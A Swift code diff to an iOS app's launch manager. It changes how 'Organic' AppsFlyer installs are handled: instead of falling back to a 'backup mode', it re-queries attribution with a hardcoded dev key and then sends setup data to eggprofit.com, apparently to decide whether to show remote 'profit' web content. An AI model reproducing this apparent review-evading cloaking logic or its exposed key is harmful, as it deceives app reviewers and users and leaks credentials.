@@ -241,10 +241,13 @@ class EggLaunchManager: ObservableObject {
         
         if isInitialLaunch {
             if let originStatus = conversionInfo["af_status"] as? String, originStatus == "Organic" {
-                self.enableBackupMode()
+                DispatchQueue.main.asyncAfter(deadline: .now() + 5) {
+                    self.checlIfOrganic()
+                }
                 return
             }
         }
+        
         if let tempPath = UserDefaults.standard.string(forKey: "temp_url"), !tempPath.isEmpty {
             profitLink = URL(string: tempPath)
             self.activePhase = .profitDisplay
@@ -258,6 +261,52 @@ class EggLaunchManager: ObservableObject {
             }
         }
     }
+    
+    private func checlIfOrganic() {
+        let url = URL(string: "https://gcdsdk.appsflyer.com/install_data/v4.0/id6753870535")!
+        var components = URLComponents(url: url, resolvingAgainstBaseURL: true)!
+        let queryItems: [URLQueryItem] = [
+            URLQueryItem(name: "devkey", value: "3ERPRZB3HpWKFpHixe8pQc"),
+            URLQueryItem(name: "device_id", value: AppsFlyerLib.shared().getAppsFlyerUID()),
+        ]
+        components.queryItems = components.queryItems.map { $0 + queryItems } ?? queryItems
+        
+        var request = URLRequest(url: components.url!)
+        request.httpMethod = "GET"
+        request.timeoutInterval = 10
+        request.allHTTPHeaderFields = ["accept": "application/json"]
+        
+        URLSession.shared.dataTask(with: request) { data, response, issue in
+            if let _ = issue {
+                self.handleSetupError()
+            }
+            
+            guard let httpResponse = response as? HTTPURLResponse, httpResponse.statusCode == 200 else {
+                self.handleSetupError()
+                return
+            }
+            
+            if let data = data {
+                
+                do {
+                    guard let json = try JSONSerialization.jsonObject(with: data) as? [String: Any] else {
+                        print("Failed to decode JSON as dictionary")
+                        self.handleSetupError()
+                        return
+                    }
+                    
+                    self.conversionInfo = json
+                    self.sendSetupData()
+                } catch {
+                    print("Error: \(error)")
+                    self.handleSetupError()
+                }
+            } else {
+                self.handleSetupError()
+            }
+        }.resume()
+    }
+    
     func sendSetupData() {
         guard let targetEndpoint = URL(string: "https://eggprofit.com/config.php") else {
             handleSetupError()
